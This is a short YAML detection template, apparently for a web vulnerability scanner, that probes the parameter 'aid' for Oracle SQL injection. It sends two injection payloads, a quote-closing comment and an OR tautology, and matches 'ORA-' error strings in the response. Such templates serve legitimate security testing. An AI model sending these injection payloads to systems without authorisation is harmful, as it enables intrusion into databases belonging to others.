id: sqli6-oracle-22
name: 'SQLi oracle probe in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - '1'')--'
        - ''' OR ''a''=''a'' /*'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
